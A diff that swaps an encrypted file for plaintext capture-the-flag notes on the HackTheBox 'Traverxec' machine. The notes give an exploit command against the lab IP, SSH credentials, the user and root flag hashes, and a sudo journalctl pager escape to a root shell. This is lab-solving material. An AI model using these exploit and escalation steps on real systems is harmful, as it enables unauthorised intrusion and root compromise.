@@ -1,4 +1,16 @@
-VimCrypt~03!m@€¼4}Nm^K©ÁÁB)Ûúˆ,‡Ğğ9Ü¶j=r¡Î5¶›Ùá~@¶—ñJtîsÚé­…äş"“~Éku³= ?õ™˜›ğ,[ÆÕÓ)K©Ó§È#áæñ2YK\ÁfİğÕãİÔ[óë]Ö’¬rHøM$™WívJ¾õ½GRg5*íFPü’¡2´\7 6üxıRm8•àšn’Á~‹Ÿ^Ø5„¸=ŠK`BÈerÚo}†P8|ãºè©+a_%
-J
-ÈØ0©$3Y)xñÃ–4Ô‹w’èäS&õvmÒ­$£§aíİiá)•…	Z2|)Bd}ÿ/Å$›fcÀeö <ZZq}dê„;"r7oÚe­
-äŠÛÙíÜoüy¡zÌæÃ>™òòÙq×hÄ”cğ©nƒÈ l,Os·D`ûbùæİuÀÚV³nÕKºÌçF
+https://github.com/cipher1234/Exploits
+python traverxec.py 10.10.10.165 80
+
+https://wuj1n9.cn/2020/01/03/HTB-Traverxec/
+
+ssh david@10.10.10.165
+ssh passphrase: hunter
+
+user.txt
+7db0b48469606a42cec20750d9782f3d
+
+/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
+and run !/bin/sh
+
+root.txt
+9aa36a6d76f785dfd320a478f6e0d906
